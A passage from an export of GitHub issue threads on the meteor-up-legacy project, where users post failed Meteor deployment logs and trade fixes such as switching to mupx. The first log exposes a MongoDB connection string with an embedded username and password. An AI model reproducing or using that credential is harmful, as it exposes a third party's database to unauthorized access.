      nodemiral:sess:45.55.70.95 copy file - src: /var/folders/wy/0fs13l4j1tj0tp9v6n408p8h0000gn/T/74f83b9b-a063-43f8-8646-b2fdd39fc315/bundle.tar.gz, dest: /opt/listory-demo/tmp/bundle.tar.gz, vars: undefined +0ms
    [45.55.70.95] - Uploading bundle: SUCCESS
    [45.55.70.95] - Setting up Environment Variables
      nodemiral:sess:45.55.70.95 copy file - src: /usr/local/lib/node_modules/mup/templates/linux/env.sh, dest: /opt/listory-demo/config/env.sh, vars: {"env":{"ROOT_URL":"http://45.55.70.95","MONGO_URL":"mongodb://ocean23:%xzo8r9dY3ri@candidate.20.mongolayer.com:11199,candidate.52.mongolayer.com:10087/listory-trial?replicaSet=set-55ee2f775cc69064a900023e","METEOR_SETTINGS":"{\"public\":{}}","CLUSTER_ENDPOINT_URL":"http://45.55.70.95:80"},"appName":"listory-demo"} +11s
    [45.55.70.95] - Setting up Environment Variables: SUCCESS
    [45.55.70.95] - Invoking deployment process
    [45.55.70.95] x Invoking deployment process: FAILED

      -----------------------------------STDERR-----------------------------------
      yp -v v3.0.3
      gyp ERR! not ok 
      npm WARN package.json meteor-dev-bundle@0.0.0 No description
      npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
      npm WARN package.json meteor-dev-bundle@0.0.0 No README data
      npm WARN package.json meteor-dev-bundle@0.0.0 No license field.
      child_process: customFds option is deprecated, use stdio instead.
      ../src/coroutine.cc: In function &#8216;void* find_thread_id_key(void*)&#8217;:
      ../src/coroutine.cc:90:3: warning: &#8216;thread_id&#8217; may be used uninitialized in this function [-Wmaybe-uninitialized]
         if (tls == thread_id) {
         ^
      js-bson: Failed to load c++ bson extension, using pure JS version
        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                       Dload  Upload   Total   Spent    Left  Speed
      0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
      Latest deployment failed! Reverted back to the previous version.
      -----------------------------------STDOUT-----------------------------------
       directory `/opt/listory-demo/tmp/bundle/programs/server/node_modules/fibers/build'
      Installed in `/opt/listory-demo/tmp/bundle/programs/server/node_modules/fibers/bin/linux-x64-v8-3.28/fibers.node`
      underscore@1.5.2 node_modules/underscore

      eachline@2.3.3 node_modules/eachline
      &#9492;&#9472;&#9472; type-of@2.0.1

      semver@4.1.0 node_modules/semver

      chalk@0.5.1 node_modules/chalk
      &#9500;&#9472;&#9472; ansi-styles@1.1.0
      &#9500;&#9472;&#9472; escape-string-regexp@1.0.3
      &#9500;&#9472;&#9472; supports-color@0.2.0
      &#9500;&#9472;&#9472; strip-ansi@0.3.0 (ansi-regex@0.2.1)
      &#9492;&#9472;&#9472; has-ansi@0.1.0 (ansi-regex@0.2.1)

      source-map-support@0.2.8 node_modules/source-map-support
      &#9492;&#9472;&#9472; source-map@0.1.32 (amdefine@0.1.0)

      fibers@1.0.5 node_modules/fibers
      Waiting for MongoDB to initialize. (5 minutes)
      { [Error: Cannot find module '../build/Release/bson'] code: 'MODULE_NOT_FOUND' }
      connected
      listory-demo stop/waiting
      listory-demo start/running, process 11838
      Waiting for 15 seconds while app is booting up
      Checking is app booted or not?
      listory-demo stop/waiting
      listory-demo start/running, process 11893
      ----------------------------------------------------------------------------
```
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Maybe extend the deployCheckWaitTime and see if that makes a difference?
And don't forget to give mupx a try if having problems with mup.
</Body>
    </Comment>
    <Comment>
      <Owner>crenwick</Owner>
      <Body>Experiencing the same issue. Node `0.10.36` works fine but upgrading it `0.12.7`, `4.0.0`, or `4.1.0` causes an almost identical error as above. Increasing the `deployCheckWaitTime` seemed to have no effect and still spewed:

``` sh
...
child_process: customFds option is deprecated, use stdio instead.
    ../src/coroutine.cc: In function &#8216;void* find_thread_id_key(void*)&#8217;:
    ../src/coroutine.cc:90:3: warning: &#8216;thread_id&#8217; may be used uninitialized in this function [-Wmaybe-uninitialized]
       if (tls == thread_id) {
       ^
    stop: Unknown instance:
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
    Latest deployment failed! Reverted back to the previous version.
...
```

I then ported over the deployment process to mupx. Again, `mupx setup` ran successfully but `mupx deploy` spat out:

``` sh
...
Errors prevented bundling:
While linking the program:
error: client-deps is not compatible with architecture 'os.linux.x86_64'


=&gt; Build Error. Check the logs printed above.
```
</Body>
    </Comment>
    <Comment>
      <Owner>kratam</Owner>
      <Body>Any update on this?
I got the same error in a digitalocean droplet. I'm totally confused because it was working yesterday (although I had to run `npm install -g node-gyp` on the server), but now I always get this error.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Looks like crenwick's error suggests it's not Ubuntu 14.
It seems the correct setting for node is 0.10.40 with meteor 1.2 the other posts might have missed that.
</Body>
    </Comment>
  </Issue_211>
  <Issue_212>
    <Repository>meteor-up-legacy</Repository>
    <Title>npm problem with deploying on metro up</Title>
    <Owner>arunoda</Owner>
    <Body>This is the error I am getting.

`Started TaskList: Deploy app 'qpinion' (linux)
[128.199.124.103] - Uploading bundle
[128.199.124.103] - Uploading bundle: SUCCESS
[128.199.124.103] - Setting up Environment Variables
[128.199.124.103] - Setting up Environment Variables: SUCCESS
[128.199.124.103] - Invoking deployment process
[128.199.124.103] x Invoking deployment process: FAILED

-----------------------------------STDERR-----------------------------------
yp -v v2.0.2
gyp ERR! not ok 
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
npm WARN package.json meteor-dev-bundle@0.0.0 No license field.
child_process: customFds option is deprecated, use stdio instead.
../src/coroutine.cc: In function &#8216;void\* find_thread_id_key(void*)&#8217;:
../src/coroutine.cc:90:3: warning: &#8216;thread_id&#8217; may be used uninitialized in this function [-Wmaybe-uninitialized]
   if (tls == thread_id) {
   ^
js-bson: Failed to load c++ bson extension, using pure JS version
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0curl: (7) Failed to connect to localhost port 80: Connection refused
Latest deployment failed! Reverted back to the previous version.
-----------------------------------STDOUT-----------------------------------
yles

escape-string-regexp@1.0.3 node_modules/escape-string-regexp

chalk@0.5.1 node_modules/chalk

has-ansi@0.1.0 node_modules/has-ansi

strip-ansi@0.3.0 node_modules/strip-ansi

supports-color@0.2.0 node_modules/supports-color

eachline@2.3.3 node_modules/eachline

type-of@2.0.1 node_modules/type-of

amdefine@1.0.0 node_modules/amdefine

asap@2.0.3 node_modules/asap

meteor-promise@0.4.6 node_modules/meteor-promise

underscore@1.5.2 node_modules/underscore

promise@7.0.4 node_modules/promise

source-map-support@0.3.2 node_modules/source-map-support

semver@4.1.0 node_modules/semver

source-map@0.1.32 node_modules/source-map

fibers@1.0.5 node_modules/fibers
Waiting for MongoDB to initialize. (5 minutes)
{ [Error: Cannot find module '../build/Release/bson'] code: 'MODULE_NOT_FOUND' }
connected
qpinion stop/waiting
qpinion start/running, process 12165
Waiting for 15 seconds while app is booting up
Checking is app booted or not?
qpinion stop/waiting
qpinion start/running, process 12261
----------------------------------------------------------------------------`
I have tried updating and re-installing npm and node. I do not know what else I can do to fix these problems as I'm fairly new to this. 
I checked the log with mup logs -n 400 and this is what I get from that, quite a few times:

`Error: Could not load the bindings file. Tried:
&#8594; /opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build/bcrypt_lib.node
&#8594; /opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build/Debug/bcrypt_lib.node
&#8594; /opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build/Release/bcrypt_lib.node
&#8594; /opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/out/Debug/bcrypt_lib.node
&#8594; /opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/Debug/bcrypt_lib.node
&#8594; /opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/out/Release/bcrypt_lib.node
&#8594; /opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/Release/bcrypt_lib.node
&#8594; /opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build/default/bcrypt_lib.node
&#8594; /opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/compiled/0.12.7/linux/x64/bcrypt_lib.node
at bindings (/opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/node_modules/bindings/bindings.js:84:13)
at Object. (/opt/qpinion/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/bcrypt.js:3:35)
at Module._compile (module.js:460:26)
at Object.Module._extensions..js (module.js:478:10)
at Module.load (module.js:355:32)
at Function.Module._load (module.js:310:12)
at Module.require (module.js:365:17)
at require (module.js:384:17)
at Object.Npm.require (/opt/qpinion/app/programs/server/boot.js:162:18)
at packages/npm-bcrypt/packages/npm-bcrypt.js:9:1
error: Forever detected script exited with code: 1
error: Script restart attempt #1
/opt/qpinion/app/programs/server/node_modules/fibers/future.js:245`

Any help be great. It was working fine until yesterday. I don't think I've changed anything other than work on my App.

Thanks
</Body>
    <State>open</State>
    <Comment>
      <Owner>lampe</Owner>
      <Body>I'am having the same error right now
</Body>
    </Comment>
    <Comment>
      <Owner>ggndpsingh-old</Owner>
      <Body>Install mupx. Its a newer version of mup. Thats what solved it for me.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>It could also be the wait time isn't long enough.
Try...
CheckWaitTime": 45
</Body>
    </Comment>
  </Issue_212>
  <Issue_213>
    <Repository>meteor-up-legacy</Repository>
    <Title>connect ETIMEDOUT error, when doing mup setup/deploy</Title>
    <Owner>arunoda</Owner>
    <Body>I tried to deploy my website using Meteor Up.  I configured my mup.json file as follows:

{
  // Server authentication info
  "servers": [
    {
      "host": "ec2-52-24-95-147.us-west-2.compute.amazonaws.com",
      "username": "ubuntu",
      //"password": "password"
      // or pem file (ssh based authentication)
      "pem": "C:/Users/Joachim/meteor.pem"
    }
  ],

  // Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": true,

  // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
  "setupNode": true,

  // WARNING: If nodeVersion omitted will setup 0.10.36 by default. Do not use v, only version number.
  "nodeVersion": "0.10.35",

  // Install PhantomJS in the server
  "setupPhantom": false,

  // Show a progress bar during the upload of the bundle to the server. 
  // Might cause an error in some rare cases if set to true, for instance in Shippable CI
  "enableUploadProgressBar": true,

  // Application name (No spaces)
  "appName": "Homepage",

  // Location of app (local directory)
  "app": "C:/website",

  // Configure environment
  "env": {
    "ROOT_URL": "ec2-52-24-95-147.us-west-2.compute.amazonaws.com",
    "PORT": 80,
    "METEOR_ENV": "production"
  },

  // Meteor Up checks if the app comes online just after the deployment
  // before mup checks that, it will wait for no. of seconds configured below
  "deployCheckWaitTime": 15
}

the error that it is displaying is the following:

throw er; // Unhandled 'error' event
 ^

Error: connect ETIMEDOUT {public IP from AWS}:22
    at Object.exports._errnoExcpetion (util.js:837:11)
    at exports._excpetionWithHostPort (util.js:860:20)
    at TCPConnectWrap.afterConnect [as oncomplete](net.js:1060:14)

does anyone have any idea what is going on?
</Body>
    <State>open</State>
    <Comment>
      <Owner>Xample</Owner>
      <Body>Same kind of problem here, this appeared overnight, I suspect the package server to be unavailable for some reason. I am not using mup for this project but the error I get is:

```
=&gt; Errors while initializing project:

While downloading agershun:alasql@0.2.0...:
error: connect ETIMEDOUT

While downloading alanning:roles@1.2.13...:
error: connect ETIMEDOUT

While downloading angular:angular@1.4.5...:
error: connect ETIMEDOUT

While downloading angularui:angular-ui-router@0.2.15...:
error: connect ETIMEDOUT

While downloading aramk:tinycolor@1.1.0_1...:
error: connect ETIMEDOUT
```

The server is not behind a firewall and has full access however using a different internet provider solved my problem, (some ip seems unreachable with my regular one) using a VPN could also have been an option (better this way than connecting from a phone / other internet provider&#8230;).

This may be related to : https://github.com/meteor/meteor/issues/2961
</Body>
    </Comment>
  </Issue_213>
  <Issue_214>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deployment from Mac to Ubuntu on AWS Failed</Title>
    <Owner>arunoda</Owner>
    <Body>Hi - I'm not sure what to do to resolve the issue below.  I can connect to the instance via SSH.  I can confirm SCP (copy) works, but not SFTP -- any ideas?

Started TaskList: Setup (linux)
[52.3.91.93] - Installing Node.js
[52.3.91.93] - Installing Node.js: SUCCESS
[52.3.91.93] - Setting up Environment
[52.3.91.93] - Setting up Environment: SUCCESS
[52.3.91.93] - Copying MongoDB configuration
[52.3.91.93] x Copying MongoDB configuration: FAILED
        Received exit code 0 while establishing SFTP session

Thanks.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>After looking around in nodemiral/lib/session.js (and ssh.js) I think maybe the (db config) "copy",  problem might be with permissions.
Like the PEM etc... maybe username? 
There's a section on that which is worth double checking, look for NOPASSWD in the mupx Readme. 
</Body>
    </Comment>
    <Comment>
      <Owner>xcrypto</Owner>
      <Body>Thanks Master James.  I decided to configure Mongo manually and update 
to mupx.  The setup appears to work now, but I get the same SFTP error 
on the deployment -- when it attempts to upload the bundle -- please the 
detail below.  I can't say with certainty that it's not a password or 
permission issue, but I verified connectivity via SSH and SCP - no problems.

By the way, I switched from Unbuntu to AMI Linux thinking that would 
resolve the issue, but it did not.

Any guidance would be greatly appreciated.  Both my issues are centered 
on the SFTP failing to establish a session...

Started TaskList: Deploy app 'myStatusfyMobile' (linux)
[52.21.105.113] - Uploading bundle
[52.21.105.113] x Uploading bundle: FAILED
         Received exit code 0 while establishing SFTP session

Thanks.

&gt; Master James mailto:notifications@github.com
&gt; September 2, 2015 at 08:36
&gt; 
&gt; After looking around in nodemiral/lib/session.js (and ssh.js) I think 
&gt; maybe the (db config) "copy", problem might be with permissions.
&gt; Like the PEM etc... maybe username?
&gt; There's a section on that which is worth double checking, look for 
&gt; NOPASSWD in the mupx Readme.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub 
&gt; https://github.com/arunoda/meteor-up/issues/636#issuecomment-137060440.
</Body>
    </Comment>
    <Comment>
      <Owner>ghost</Owner>
      <Body>I am also getting this error. 
</Body>
    </Comment>
    <Comment>
      <Owner>ghost</Owner>
      <Body>The solution to this problem is to do everything as root on the aws instance. That means configuring ~/.ssh/config on your computer to silently login to your instance as root, and to make sure that everything that was in /home/ubuntu/.ssh on the aws instance is in /home/root/.ssh/, i.e., authorized_keys.
</Body>
    </Comment>
    <Comment>
      <Owner>arrutneo</Owner>
      <Body>Hi @brianmingus! I'm also getting this error. I'm using a MBP with "El capitan". I tried to follow your instructions but I could not find everything on my computer.

For example I do not have ~/.ssh/config what I have under ~/.ssh/ is:

```
-rw-------  1 Arruti  staff  1766 Nov 25  2014 id_rsa
-rw-r--r--  1 Arruti  staff   399 Nov 25  2014 id_rsa.pub
-rw-r--r--  1 Arruti  staff  1770 Nov  5 08:53 known_hosts
```

Also I do not have this folder  /home/ubuntu

Should I create it and save my .pem file under it?

Thanks in advance!
</Body>
    </Comment>
    <Comment>
      <Owner>ghost</Owner>
      <Body>@arrutneo your .ssh/config file allows passwordless ssh. For example:

``` text
Host somesite.com
IdentityFile ~/.ssh/some.pem
User root
```

This file should exist wherever you are running mup from, i.e., in ~/.ssh/config on your MBP.
</Body>
    </Comment>
    <Comment>
      <Owner>sameeparora</Owner>
      <Body>I have the same problem on Windows. What was the final solution?
</Body>
    </Comment>
  </Issue_214>
  <Issue_215>
    <Repository>meteor-up-legacy</Repository>
    <Title>Smart Deploy &#8211; Deploy without Setup</Title>
    <Owner>arunoda</Owner>
    <Body>Just an idea, do we really need the setup step? Can't we just have deploy be smart and install new versions of node, mongo if the current meteor versions require that and all that?

I mean just do `meteor up deploy` and you're all set.
</Body>
    <State>open</State>
    <Comment>
      <Owner>KrishnaPG</Owner>
      <Body>+1 Thats a good method indeed.
</Body>
    </Comment>
    <Comment>
      <Owner>4shaw</Owner>
      <Body>Yeah good idea... One issue I have is when I "mupx setup" on the same server all the other meteor apps loose their connection to the database... That will have to be fixed else every time you deploy you will have to restart all the other meteor apps on that server... Its a rather painful issue... Anyone know why that happens?
</Body>
    </Comment>
  </Issue_215>
  <Issue_216>
    <Repository>meteor-up-legacy</Repository>
    <Title>Add possibility to deploy meteor user on user space without root permission</Title>
    <Owner>arunoda</Owner>
    <Body>mup is great but it is a pain that all is deployed in root space.
would be great to be able to override deployment directory such as in the user space so that root or sudo access is not required.  
</Body>
    <State>open</State>
    <Comment>
      <Owner>danlg</Owner>
      <Body>duplicate of Allow non-root account to setup and deploy #34
</Body>
    </Comment>
  </Issue_216>
  <Issue_217>
    <Repository>meteor-up-legacy</Repository>
    <Title>A project already exists not detailed message</Title>
    <Owner>arunoda</Owner>
    <Body>On my local box, I get  "A Project Already Exists"

dan@localhost:~/DEV/github2/lgen/app$ mup init
## Meteor Up: Production Quality Meteor Deployments

A Project Already Exists

I remove every meteor .meteor project and project n the server side even the meteor binary.
But still get that error message. Any idea ?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sherif84</Owner>
      <Body>I'm having the same issue , can't find any documentation regarding this . 
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>The code in mupx/lib/actions.js seems to suggest that error means mup.json or setting.json is found.

```
Actions.init  = function() {
  var destMupJson = path.resolve('mup.json');
  var destSettingsJson = path.resolve('settings.json');

  if(fs.existsSync(destMupJson) || fs.existsSync(destSettingsJson)) {
    console.error('A Project Already Exists'.bold.red);
    process.exit(1);
  }
```
</Body>
    </Comment>
    <Comment>
      <Owner>sherif84</Owner>
      <Body>Yup , just figured that out , i  deleted the settings.json file and no longer seeing the issue . Thank @MasterJames  
</Body>
    </Comment>
    <Comment>
      <Owner>satyavh</Owner>
      <Body>Seriously, what a bad programming. And not even fixed after a year... 
Wasted my life to figure this out... :-(
</Body>
    </Comment>
  </Issue_217>
  <Issue_218>
    <Repository>meteor-up-legacy</Repository>
    <Title>change ROOT_URL in mup.json does not take effect</Title>
    <Owner>arunoda</Owner>
    <Body>Hi, Arunoda,

I just met this problem:
I was setting ROOT_URL to site-A, and deploy to aws server, and it worked.
Then I change the website name to site-B (change dns in godaddy and ROOT_URL in mup.json).
I am able to access site-B through browser, but, when I rebuild the app and run it in xcode,
for the first second, it was able to work, but after 1-2 second, it becomes stuck in loading screen (looks like the code is pushed from aws server to ios simulator to update the code, and then got stuck in loading screen). 

The weird thing is: I check it in safari, and it reports connection failure to "site-A", not "site-B".
I checked my code, everything in my code is updated from site-A to site-B. So I am thinking if when I run "mup deploy", it will use some old build files, which could cause this problem.

Looking forward to hearing from you.
Thanks
</Body>
    <State>open</State>
    <Comment>
      <Owner>rlech</Owner>
      <Body>`mupx reconfig` to set your env again on the server
</Body>
    </Comment>
  </Issue_218>
  <Issue_219>
    <Repository>meteor-up-legacy</Repository>
    <Title>x Invoking deployment process: FAILED</Title>
    <Owner>arunoda</Owner>
    <Body>hi,

im following the deployment tutorial : https://www.youtube.com/watch?v=WLGdXtZMmiI .

I followed everything exactly and everything step works, up till the last part where i type 'mup deploy' . When i do this, i get an error 'Invoking deployment process: FAILED' and a bunch of logs, one of them being 'wait-for-mongo: failed to connect to [127.0.0.1:27017]'

Is there any way to resolve this? I already contacted compose support but they said everything is fine on their end, including my mup.json file which i sent to them for checking. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You could try mupx that seems to help with various issues. 
Posting settings and logs would be a start if that doesn't help.
I guess there's a migration guide for mupx from mup and some compatibility issues with only Ubuntu being supported, 1GB+ RAM images etc.
</Body>
    </Comment>
    <Comment>
      <Owner>Maverick777</Owner>
      <Body>hi, thank you for the suggestion. 
i just tried using mupx and i got this error :  Error: MONGO_URL must be set in environment

any ideas?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>That is true if you set 
Setup Mongo = false
Then you need Mongo running g by other means and point to it.
I think you just want to try "true" first maybe.
</Body>
    </Comment>
  </Issue_219>
  <Issue_220>
    <Repository>meteor-up-legacy</Repository>
    <Title>Uploading bundle: FAILED</Title>
    <Owner>arunoda</Owner>
    <Body>Hi, I'm trying to deploy using mup, I've done mup setup which seemed to work, unfortunately mup deploy does not work. http://imgur.com/cDuBtP4.png is the log of my issue.

I know most of the issues of this are a result of not doing mup setup, but I have done that so idk what is wrong.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Are you doing "mupx deploy" from the same working directory that you run meteor in? 
Or ya do try mupx if mup not cutting it. There's a migration guide if you tried mup already.
</Body>
    </Comment>
  </Issue_220>
  <Issue_221>
    <Repository>meteor-up-legacy</Repository>
    <Title>Question : Is Meteor Up needed on my local box and on my Server?</Title>
    <Owner>arunoda</Owner>
    <Body>Greetings, 

I am just getting started with Meteor Up. 
First and foremost thank you for creating such a great project i've reviewed the documentation and I am very excited. 

So the question I have is the workflow for deploying and setting up Meteor Up. I have a digital ocean account which is where I will host my projects. 
1. Do I need to install Meteor Up on my local box and on Digital Ocean? or Just Digital Ocean? 
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Typically you put mup or preferably mupx on your local developer system and use it to deploy the project to the server. You'll figure it out.
</Body>
    </Comment>
    <Comment>
      <Owner>rwatts3</Owner>
      <Body>Hey thank you actually I did figure it out . It's actually so simple it seems a lot more complicated at first glance but when you actually look at the installation guide is pretty straightforward
</Body>
    </Comment>
  </Issue_221>
  <Issue_222>
    <Repository>meteor-up-legacy</Repository>
    <Title>mup up deploy fails all of sudden</Title>
    <Owner>arunoda</Owner>
    <Body>Since you were extremely helpful the last time, I am asking you one more time to see if you're familiar with this issue too. This is the logs from the console, and doing `mup logs -n 1000` gives me nothing.

[x] - Uploading bundle
[x] &#10004; Uploading bundle: SUCCESS
[x] - Setting up Environment Variables
[x] &#10004; Setting up Environment Variables: SUCCESS
[x] - Invoking deployment process
[x] &#10008; Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
fo spawn args   '-I',
gyp info spawn args   '/usr/lib/node_modules/node-gyp/addon.gypi',
gyp info spawn args   '-I',
gyp info spawn args   '/root/.node-gyp/0.10.36/common.gypi',
gyp info spawn args   '-Dlibrary=shared_library',
gyp info spawn args   '-Dvisibility=default',
gyp info spawn args   '-Dnode_root_dir=/root/.node-gyp/0.10.36',
gyp info spawn args   '-Dnode_gyp_dir=/usr/lib/node_modules/node-gyp',
gyp info spawn args   '-Dmodule_root_dir=/opt/toaster/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt',
gyp info spawn args   '--depth=.',
gyp info spawn args   '--no-parallel',
gyp info spawn args   '--generator-output',
gyp info spawn args   'build',
gyp info spawn args   '-Goutput_dir=.' ]
gyp info spawn make
gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ]
gyp info ok 
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data

-----------------------------------STDOUT-----------------------------------
 &gt; ./bcrypt: npm install due to binary npm modules
bindings@1.0.0 node_modules/bindings

nodeunit@0.9.1 node_modules/nodeunit
&#9492;&#9472;&#9472; tap@0.7.1 (inherits@2.0.1, buffer-equal@0.0.1, slide@1.1.6, deep-equal@1.0.0, yamlish@0.0.7, nopt@3.0.3, mkdirp@0.5.1, difflet@0.2.6, glob@4.5.3, runforcover@0.0.2)
make: Entering directory `/opt/toaster/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build'
  CXX(target) Release/obj.target/bcrypt_lib/src/blowfish.o
  CXX(target) Release/obj.target/bcrypt_lib/src/bcrypt.o
  CXX(target) Release/obj.target/bcrypt_lib/src/bcrypt_node.o
  SOLINK_MODULE(target) Release/obj.target/bcrypt_lib.node
  COPY Release/bcrypt_lib.node
make: Leaving directory `/opt/toaster/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build'

&gt; fibers@1.0.5 install /opt/toaster/tmp/bundle/programs/server/node_modules/fibers
&gt; node ./build.js
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>sahina</Owner>
      <Body>Same here. Meteor version 1.1.0.3.

[104.131.32.102] - Uploading bundle
[104.131.32.102] - Uploading bundle: SUCCESS
[104.131.32.102] - Setting up Environment Variables
[104.131.32.102] - Setting up Environment Variables: SUCCESS
[104.131.32.102] - Invoking deployment process
[104.131.32.102] x Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
yp_dir=/usr/lib/node_modules/node-gyp',
gyp info spawn args   '-Dmodule_root_dir=/opt/gohplay/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt',
gyp info spawn args   '--depth=.',
gyp info spawn args   '--no-parallel',
gyp info spawn args   '--generator-output',
gyp info spawn args   'build',
gyp info spawn args   '-Goutput_dir=.' ]
gyp info spawn make
gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ]
gyp info ok
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
```

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------
      COPY Release/bcrypt_lib.node
    make: Leaving directory `/opt/gohplay/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build'

```
&gt; fibers@1.0.5 install /opt/gohplay/tmp/bundle/programs/server/node_modules/fibers
&gt; node ./build.js

`linux-x64-v8-3.14` exists; testing
Binary is fine; exiting
underscore@1.5.2 node_modules/underscore

eachline@2.3.3 node_modules/eachline
&#9492;&#9472;&#9472; type-of@2.0.1

semver@4.1.0 node_modules/semver

chalk@0.5.1 node_modules/chalk
&#9500;&#9472;&#9472; ansi-styles@1.1.0
&#9500;&#9472;&#9472; escape-string-regexp@1.0.3
&#9500;&#9472;&#9472; supports-color@0.2.0
&#9500;&#9472;&#9472; has-ansi@0.1.0 (ansi-regex@0.2.1)
&#9492;&#9472;&#9472; strip-ansi@0.3.0 (ansi-regex@0.2.1)

fibers@1.0.5 node_modules/fibers

source-map-support@0.2.8 node_modules/source-map-support
&#9492;&#9472;&#9472; source-map@0.1.32 (amdefine@0.1.0)
Waiting for MongoDB to initialize. (5 minutes)
connected
gohplay stop/waiting
gohplay start/running, process 1750
Waiting for 15 seconds while app is booting up
Checking is app booted or not?
gohplay stop/waiting
gohplay start/running, process 1787
----------------------------------------------------------------------------
```
</Body>
    </Comment>
    <Comment>
      <Owner>funkybunky</Owner>
      <Body>same issue here, I downgraded to Meteor 1.1.0.2, but that didn't help either
EDIT: nope, was my fault. app just threw an error. fixed it and now deployment works as normal.
didn't update to newest Meteor, though
</Body>
    </Comment>
    <Comment>
      <Owner>dapearce</Owner>
      <Body>I was having similar issues with this, couldn't deploy at all on digital ocean. I switched over to mupx and it works great now.
</Body>
    </Comment>
  </Issue_222>
  <Issue_223>
    <Repository>meteor-up-legacy</Repository>
    <Title>Invoking deployment process: FAILED - Where did I go wrong?</Title>
    <Owner>arunoda</Owner>
    <Body>Hi,

I was deploying my app like many times before but this time it threwup a error. I'm scratching my head over this one.

-----------------------------------STDERR-----------------------------------
        ypt/node_modules/bcrypt
        gyp ERR! node -v v0.12.1
        gyp ERR! node-gyp -v v2.0.1
        gyp ERR! not ok 
        npm WARN package.json meteor-dev-bundle@0.0.0 No description
        npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
        npm WARN package.json meteor-dev-bundle@0.0.0 No README data
        child_process: customFds option is deprecated, use stdio instead.
        child_process: customFds option is deprecated, use stdio instead.
        ../src/coroutine.cc: In function &#8216;void\* find_thread_id_key(void*)&#8217;:
        ../src/coroutine.cc:90:3: warning: &#8216;thread_id&#8217; may be used uninitialized in this function [-Wmaybe-uninitialized]
           if (tls == thread_id) {
           ^
          % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                         Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
        Latest deployment failed! Reverted back to the previous version.
        -----------------------------------STDOUT-----------------------------------
        rs.node
          SOLINK_MODULE(target) Release/obj.target/fibers.node: Finished
          COPY Release/fibers.node
        make: Leaving directory `/opt/eventum/tmp/bundle/programs/server/node_modules/fibers/build'
        Installed in`/opt/eventum/tmp/bundle/programs/server/node_modules/fibers/bin/linux-x64-v8-3.28/fibers.node`
        underscore@1.5.2 node_modules/underscore

```
    eachline@2.3.3 node_modules/eachline
    &#9492;&#9472;&#9472; type-of@2.0.1

    chalk@0.5.1 node_modules/chalk
    &#9500;&#9472;&#9472; ansi-styles@1.1.0
    &#9500;&#9472;&#9472; escape-string-regexp@1.0.3
    &#9500;&#9472;&#9472; supports-color@0.2.0
    &#9500;&#9472;&#9472; has-ansi@0.1.0 (ansi-regex@0.2.1)
    &#9492;&#9472;&#9472; strip-ansi@0.3.0 (ansi-regex@0.2.1)

    semver@4.1.0 node_modules/semver

